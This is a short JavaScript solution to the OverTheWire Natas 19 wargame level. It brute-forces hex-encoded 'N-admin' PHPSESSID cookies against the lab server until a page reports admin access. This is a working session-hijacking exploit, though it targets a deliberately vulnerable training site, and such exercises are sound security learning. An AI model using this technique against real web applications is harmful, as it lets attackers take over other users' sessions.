(async function Natas19(){
    const url ='http://natas19.natas.labs.overthewire.org/index.php';
    
    const adminRegex = /You are an admin/
    const maxSessions = 640;

    function stringToHex(str){
        return str.split('').reduce((acc, char)=> {
            const code = char.charCodeAt(0).toString(16);
            return acc+code;
        },'');
    }
    
    let finished = false;
    for (let i = 0; i < maxSessions+1 && !finished; i++){
        const sessionString= `${i}-admin`;
        //console.log(`Attempting '${sessionString}': ${stringToHex(sessionString)}`)
        document.cookie = `PHPSESSID=${stringToHex(sessionString)}`;    // I can't seem to set cookie as part of the `Fetch()` `options.headers.cookie)`, so just do it here
        const page = await fetch(url).then(x => x.text());
        
        if (adminRegex.test(page)){
            console.warn(`Got in with id ${i}\n`,page);
            finished = true;   
        }
        console.info('non-matched:\n',page);
    }
})();